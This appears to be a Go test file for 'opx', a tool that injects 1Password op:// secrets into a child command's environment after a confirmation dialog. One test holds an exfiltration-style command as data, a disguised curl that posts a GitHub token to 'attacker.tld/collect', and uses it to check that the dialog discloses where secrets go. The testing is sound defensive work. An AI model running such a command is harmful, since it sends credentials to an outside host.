package main

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/bestdan/opx/internal/caller"

	"github.com/bestdan/opx/internal/spawn"
)

// fakeSpawner records what would have been exec'd without actually doing so.
type fakeSpawner struct {
	called   int
	lastArgv []string
	lastEnv  []string
	exitCode int
	err      error
}

func (f *fakeSpawner) Spawn(_ context.Context, argv []string, env []string) (int, error) {
	f.called++
	f.lastArgv = append([]string(nil), argv...)
	f.lastEnv = append([]string(nil), env...)
	return f.exitCode, f.err
}

// envValue extracts NAME's value from a Spawn call's env slice. Returns
// ("", false) if absent.
func envValue(env []string, name string) (string, bool) {
	prefix := name + "="
	for _, kv := range env {
		if strings.HasPrefix(kv, prefix) {
			return strings.TrimPrefix(kv, prefix), true
		}
	}
	return "", false
}

func writeEnvFile(t *testing.T, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "secrets.env")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("write env file: %v", err)
	}
	return path
}

func TestRunSubcommand_Success(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\nBAR=literal\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("alpha")}}
	fc := allow()
	fs := &fakeSpawner{exitCode: 0}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo", "hi"}, fr, fc, fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if fs.called != 1 {
		t.Fatalf("spawn called %d times, want 1", fs.called)
	}
	if got := fs.lastArgv; len(got) != 2 || got[0] != "echo" || got[1] != "hi" {
		t.Errorf("argv = %v, want [echo hi]", got)
	}
	if v, ok := envValue(fs.lastEnv, "FOO"); !ok || v != "alpha" {
		t.Errorf("FOO = %q,%v want alpha,true", v, ok)
	}
	if v, ok := envValue(fs.lastEnv, "BAR"); !ok || v != "literal" {
		t.Errorf("BAR = %q,%v want literal,true", v, ok)
	}
	if fc.calls != 1 {
		t.Errorf("Confirm calls = %d, want 1", fc.calls)
	}
	if fr.forgetCalled != 1 {
		t.Errorf("ForgetSession called %d times, want 1", fr.forgetCalled)
	}
}

func TestRunSubcommand_Deny_NoSpawn(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("alpha")}}
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, deny(), fs)
	if code != exitDenied {
		t.Errorf("exit = %d, want %d", code, exitDenied)
	}
	if fs.called != 0 {
		t.Errorf("spawn called %d times after deny; want 0", fs.called)
	}
	if len(fr.readCalls) != 0 {
		t.Errorf("ReadSecret called after deny: %v", fr.readCalls)
	}
	if fr.forgetCalled != 0 {
		t.Errorf("ForgetSession called %d times after deny; want 0", fr.forgetCalled)
	}
}

func TestRunSubcommand_ReadFailure_AtomicNoSpawn(t *testing.T) {
	envPath := writeEnvFile(t, "A=op://V/A/f\nB=op://V/B/f\n")
	fr := &fakeRunner{
		secrets:   map[string][]byte{"op://V/A/f": []byte("alpha")},
		failOnURI: "op://V/B/f",
	}
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, allow(), fs)
	if code != exitOpFail {
		t.Errorf("exit = %d, want %d", code, exitOpFail)
	}
	if fs.called != 0 {
		t.Errorf("spawn called %d times; want 0 (atomic batch must not exec on read failure)", fs.called)
	}
	if fr.forgetCalled != 1 {
		t.Errorf("ForgetSession called %d times, want 1", fr.forgetCalled)
	}
}

func TestRunSubcommand_PropagatesExitCode(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("alpha")}}
	fs := &fakeSpawner{exitCode: 42}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "false"}, fr, allow(), fs)
	if code != 42 {
		t.Errorf("exit = %d, want 42 (child exit code must propagate)", code)
	}
}

func TestRunSubcommand_SpawnError(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("alpha")}}
	fs := &fakeSpawner{err: errors.New("boom")}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "missing-cmd"}, fr, allow(), fs)
	if code != exitOpFail {
		t.Errorf("exit = %d, want %d", code, exitOpFail)
	}
	if fr.forgetCalled != 1 {
		t.Errorf("ForgetSession called %d times, want 1 (must run before spawn attempt)", fr.forgetCalled)
	}
}

func TestRunSubcommand_NoOpURIsSkipsConfirm(t *testing.T) {
	// Pure dotenv loader behavior: no op:// references → no biometric prompt.
	envPath := writeEnvFile(t, "MODE=debug\nLOG_LEVEL=info\n")
	fr := &fakeRunner{}
	fc := allow()
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, fc, fs)
	if code != exitSuccess {
		t.Errorf("exit = %d, want %d", code, exitSuccess)
	}
	if fc.calls != 0 {
		t.Errorf("Confirm calls = %d, want 0 (no op:// refs → no prompt)", fc.calls)
	}
	if fs.called != 1 {
		t.Errorf("spawn called %d times, want 1", fs.called)
	}
	if v, _ := envValue(fs.lastEnv, "MODE"); v != "debug" {
		t.Errorf("MODE = %q, want debug", v)
	}
}

func TestRunSubcommand_InlineEnvOverridesFile(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/A/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{
		"op://V/A/f": []byte("from-file"),
		"op://V/B/f": []byte("from-cli"),
	}}
	fs := &fakeSpawner{}

	code := runWith([]string{
		"run",
		"--env-file=" + envPath,
		"--env", "FOO=op://V/B/f",
		"--", "echo",
	}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if v, _ := envValue(fs.lastEnv, "FOO"); v != "from-cli" {
		t.Errorf("FOO = %q, want from-cli (inline --env must win over --env-file)", v)
	}
	// Only one URI should actually be read — the overridden one is skipped.
	if len(fr.readCalls) != 1 || fr.readCalls[0] != "op://V/B/f" {
		t.Errorf("readCalls = %v, want [op://V/B/f]", fr.readCalls)
	}
}

// Same as the previous test but with the flags reversed: --env before
// --env-file. Inline wins on identity, not on position, so a checked-in env
// file loaded after an explicit override can't quietly reinstate its own
// value.
func TestRunSubcommand_InlineEnvOverridesLaterFile(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/A/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{
		"op://V/A/f": []byte("from-file"),
		"op://V/B/f": []byte("from-cli"),
	}}
	fs := &fakeSpawner{}

	code := runWith([]string{
		"run",
		"--env", "FOO=op://V/B/f",
		"--env-file=" + envPath,
		"--", "echo",
	}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if v, _ := envValue(fs.lastEnv, "FOO"); v != "from-cli" {
		t.Errorf("FOO = %q, want from-cli (inline --env must win regardless of flag order)", v)
	}
	if len(fr.readCalls) != 1 || fr.readCalls[0] != "op://V/B/f" {
		t.Errorf("readCalls = %v, want [op://V/B/f]", fr.readCalls)
	}
}

// Between two files, ordinary last-wins still applies — the inline-priority
// rule must not flatten that.
func TestRunSubcommand_LaterFileOverridesEarlierFile(t *testing.T) {
	first := writeEnvFile(t, "FOO=op://V/A/f\n")
	second := writeEnvFile(t, "FOO=op://V/B/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{
		"op://V/A/f": []byte("first"),
		"op://V/B/f": []byte("second"),
	}}
	fs := &fakeSpawner{}

	code := runWith([]string{
		"run", "--env-file=" + first, "--env-file=" + second, "--", "echo",
	}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if v, _ := envValue(fs.lastEnv, "FOO"); v != "second" {
		t.Errorf("FOO = %q, want second (later --env-file wins between files)", v)
	}
}

func TestRunSubcommand_MissingFile(t *testing.T) {
	fr := &fakeRunner{}
	fs := &fakeSpawner{}
	code := runWith([]string{"run", "--env-file=/no/such/file.env", "--", "echo"}, fr, allow(), fs)
	if code != exitUsage {
		t.Errorf("exit = %d, want %d", code, exitUsage)
	}
	if fs.called != 0 {
		t.Errorf("spawn called on missing env file")
	}
}

func TestRunSubcommand_NoCommand(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{}
	fs := &fakeSpawner{}
	code := runWith([]string{"run", "--env-file=" + envPath}, fr, allow(), fs)
	if code != exitUsage {
		t.Errorf("exit = %d, want %d", code, exitUsage)
	}
	if fs.called != 0 {
		t.Errorf("spawn called with empty argv")
	}
}

func TestRunSubcommand_BadOPURIRejected(t *testing.T) {
	// Looks like an op:// URI but is malformed. Must not silently pass
	// through as a literal value.
	envPath := writeEnvFile(t, "FOO=op://broken\n")
	fr := &fakeRunner{}
	fs := &fakeSpawner{}
	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, allow(), fs)
	if code != exitUsage {
		t.Errorf("exit = %d, want %d (malformed op:// must be rejected)", code, exitUsage)
	}
	if fs.called != 0 {
		t.Errorf("spawn called with malformed URI in env file")
	}
}

func TestRunSubcommand_DialogCoversAllURIs(t *testing.T) {
	envPath := writeEnvFile(t, "A=op://V/A/f\nB=op://V/B/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{
		"op://V/A/f": []byte("a"),
		"op://V/B/f": []byte("b"),
	}}
	fc := allow()
	fs := &fakeSpawner{}

	_ = runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, fc, fs)
	if fc.calls != 1 {
		t.Fatalf("Confirm calls = %d, want 1", fc.calls)
	}
	if got := len(fc.lastRequest.Bindings); got != 2 {
		t.Errorf("Confirm bindings = %d, want 2 (single dialog covers full batch)", got)
	}
	got := []string{fc.lastRequest.Bindings[0].Name, fc.lastRequest.Bindings[1].Name}
	sort.Strings(got)
	if got[0] != "A" || got[1] != "B" {
		t.Errorf("Confirm bound names = %v, want [A B]", got)
	}
}

func TestRunSubcommand_ConfirmDetailDescribesChildCommand(t *testing.T) {
	// The dialog's detail line in run mode must describe the command about
	// to be spawned — the process that will actually receive the secrets —
	// not the calling ancestry, which the header already names.
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("v")}}
	fc := allow()
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "python3", "linear-archive.py", "--team", "PreThink"}, fr, fc, fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if fc.calls != 1 {
		t.Fatalf("Confirm calls = %d, want 1", fc.calls)
	}
	want := "to run: python3 linear-archive.py --team PreThink"
	if fc.lastRequest.CallerDetail != want {
		t.Errorf("CallerDetail = %q, want %q", fc.lastRequest.CallerDetail, want)
	}
}

func TestRunSubcommand_ConfirmDetailKeepsChildPathAndDestination(t *testing.T) {
	// End-to-end guard on the finding: the dialog is the only disclosure of
	// where the secrets go, so neither the binary's directory nor a URL
	// argument may be shortened away between argv and Confirm.
	envPath := writeEnvFile(t, "GITHUB_TOKEN=op://Private/GitHub/token\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://Private/GitHub/token": []byte("v")}}
	fc := allow()
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "/tmp/.cache/curl", "-d", "@-", "https://attacker.tld/collect"}, fr, fc, fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	detail := fc.lastRequest.CallerDetail
	for _, must := range []string{"/tmp/.cache/curl", "https://attacker.tld/collect"} {
		if !strings.Contains(detail, must) {
			t.Errorf("CallerDetail must disclose %q; got %q", must, detail)
		}
	}
}

func TestRunSubcommand_ImplicitArgvWithoutDoubleDash(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("v")}}
	fs := &fakeSpawner{}
	// No `--` between flags and the command, mirroring `op run` UX.
	code := runWith([]string{"run", "--env-file=" + envPath, "echo", "hello"}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if got := fs.lastArgv; len(got) != 2 || got[0] != "echo" || got[1] != "hello" {
		t.Errorf("argv = %v, want [echo hello]", got)
	}
}

func TestRunSubcommand_SecretValueWithSpecialChars(t *testing.T) {
	// Secrets with newlines, quotes, $, etc. must reach the child verbatim
	// — env vars don't go through a shell, so no quoting is needed.
	tricky := "it's \"tricky\"\n$x"
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte(tricky)}}
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if v, _ := envValue(fs.lastEnv, "FOO"); v != tricky {
		t.Errorf("FOO = %q, want %q", v, tricky)
	}
}

// `op read` newline-terminates its output. That trailing byte must not reach
// the child — an API key or connection string ending in "\n" is rejected by
// most consumers, and unlike `$(opx op://...)` there is no shell to strip it.
func TestRunSubcommand_StripsOpReadTrailingNewline(t *testing.T) {
	envPath := writeEnvFile(t, "TOKEN=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("sk-abc123\n")}}
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	if v, _ := envValue(fs.lastEnv, "TOKEN"); v != "sk-abc123" {
		t.Errorf("TOKEN = %q, want %q (op's trailing newline must be stripped)", v, "sk-abc123")
	}
}

// Only ONE trailing newline is op's own — a genuinely multiline secret (PEM
// key, certificate) keeps its final newline.
func TestRunSubcommand_KeepsMultilineSecretFinalNewline(t *testing.T) {
	envPath := writeEnvFile(t, "KEY=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("-----BEGIN-----\nbody\n-----END-----\n\n")}}
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	want := "-----BEGIN-----\nbody\n-----END-----\n"
	if v, _ := envValue(fs.lastEnv, "KEY"); v != want {
		t.Errorf("KEY = %q, want %q", v, want)
	}
}

func TestRunSubcommand_DoubleDashLetsChildKeepFlags(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("v")}}
	fs := &fakeSpawner{}
	code := runWith([]string{"run", "--env-file=" + envPath, "--", "mycmd", "--verbose", "--env=foo"}, fr, allow(), fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	want := []string{"mycmd", "--verbose", "--env=foo"}
	if strings.Join(fs.lastArgv, "|") != strings.Join(want, "|") {
		t.Errorf("argv = %v, want %v (-- must end opx flag parsing)", fs.lastArgv, want)
	}
}

// guard against accidentally regressing: a spawner type assertion guarantees
// the fake satisfies the interface signature used in main.go.
var _ spawn.Spawner = (*fakeSpawner)(nil)

// Run mode hands control to a potentially long-lived child, so a failed
// signout must abort rather than spawn a child holding a live op session.
func TestRunSubcommand_ForgetFailure_NoSpawn(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{
		secrets:   map[string][]byte{"op://V/I/f": []byte("alpha")},
		forgetErr: errors.New("simulated signout failure"),
	}
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "echo"}, fr, allow(), fs)
	if code != exitOpFail {
		t.Errorf("exit = %d, want %d", code, exitOpFail)
	}
	if fs.called != 0 {
		t.Errorf("spawn called %d times after signout failure; want 0 (child must not inherit a live session)", fs.called)
	}
	if fr.forgetCalled != 1 {
		t.Errorf("ForgetSession called %d times, want 1", fr.forgetCalled)
	}
}

// TestOriginLine covers the wording of the dialog's origin line against
// synthetic identities, since a live process tree cannot produce an anomalous
// path on demand. The empty case matters most: an unknown path must yield no
// line at all, rather than a "from " that implies a location was verified.
func TestOriginLine(t *testing.T) {
	cases := []struct {
		name string
		id   caller.Identity
		want string
	}{
		{
			name: "conventional path",
			id:   caller.Identity{Name: "claude", Path: "/usr/local/bin/claude"},
			want: "from /usr/local/bin/claude",
		},
		{
			name: "unconventional path is disclosed, not judged",
			id:   caller.Identity{Name: "claude", Path: "/Users/x/.cache/claude"},
			want: "from /Users/x/.cache/claude",
		},
		{
			name: "unknown path renders no line",
			id:   caller.Identity{Name: "unknown"},
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := originLine(tc.id); got != tc.want {
				t.Errorf("originLine = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestThroughLine covers the wording of the dialog's disclosure of what the
// identity walk passed over. The empty case matters most: nothing worth
// disclosing must yield no line at all, since a line that appears on every
// ordinary read is one the user learns to skim.
func TestThroughLine(t *testing.T) {
	cases := []struct {
		name string
		id   caller.Identity
		want string
	}{
		{
			name: "nothing walked past renders no line",
			id:   caller.Identity{Name: "claude", Path: "/usr/local/bin/claude"},
			want: "",
		},
		{
			name: "one skipped ancestor",
			id:   caller.Identity{Name: "claude", Through: []string{"/Users/x/.cache/tools/bash"}},
			want: "through /Users/x/.cache/tools/bash",
		},
		{
			// Order is the caller package's; this only supplies the separator.
			name: "several, nearest to opx last",
			id:   caller.Identity{Name: "claude", Through: []string{"/Users/x/.cache/tools/bash", "unknown"}},
			want: "through /Users/x/.cache/tools/bash › unknown",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := throughLine(tc.id); got != tc.want {
				t.Errorf("throughLine = %q, want %q", got, tc.want)
			}
		})
	}
}

// TestRunSubcommand_ConfirmThroughDisclosesSkippedAncestry guards the wiring in
// the mode that needs it most: in run mode the detail line describes the child,
// so the through line is the only account of what stood between the named
// caller and opx. The expectation is computed from the same source the
// production path uses, so it holds wherever the test runs — including under a
// sandbox where `ps` cannot be exec'd and the honest answer is no line.
func TestRunSubcommand_ConfirmThroughDisclosesSkippedAncestry(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("v")}}
	fc := allow()
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "python3", "script.py"}, fr, fc, fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	want := throughLine(caller.Current())
	if fc.lastRequest.CallerThrough != want {
		t.Errorf("CallerThrough = %q, want %q", fc.lastRequest.CallerThrough, want)
	}
	if fc.lastRequest.CallerThrough != "" && !strings.HasPrefix(fc.lastRequest.CallerThrough, "through ") {
		t.Errorf("CallerThrough = %q, want it to read as a 'through <path>' line", fc.lastRequest.CallerThrough)
	}
}

// TestRunSubcommand_ConfirmOriginNamesRequestingProcess guards the wiring the
// origin line exists for: in run mode the detail line describes the child, so
// without this the dialog would identify the requesting process only by a name
// it chose for itself. The expectation is computed from the same source the
// production path uses, so it holds wherever the test runs — including where
// `ps` is unavailable and the honest answer is no line.
func TestRunSubcommand_ConfirmOriginNamesRequestingProcess(t *testing.T) {
	envPath := writeEnvFile(t, "FOO=op://V/I/f\n")
	fr := &fakeRunner{secrets: map[string][]byte{"op://V/I/f": []byte("v")}}
	fc := allow()
	fs := &fakeSpawner{}

	code := runWith([]string{"run", "--env-file=" + envPath, "--", "python3", "script.py"}, fr, fc, fs)
	if code != exitSuccess {
		t.Fatalf("exit = %d, want %d", code, exitSuccess)
	}
	want := originLine(caller.Current())
	if fc.lastRequest.CallerOrigin != want {
		t.Errorf("CallerOrigin = %q, want %q", fc.lastRequest.CallerOrigin, want)
	}
	if fc.lastRequest.CallerOrigin != "" && !strings.HasPrefix(fc.lastRequest.CallerOrigin, "from ") {
		t.Errorf("CallerOrigin = %q, want it to read as a 'from <path>' line", fc.lastRequest.CallerOrigin)
	}
}
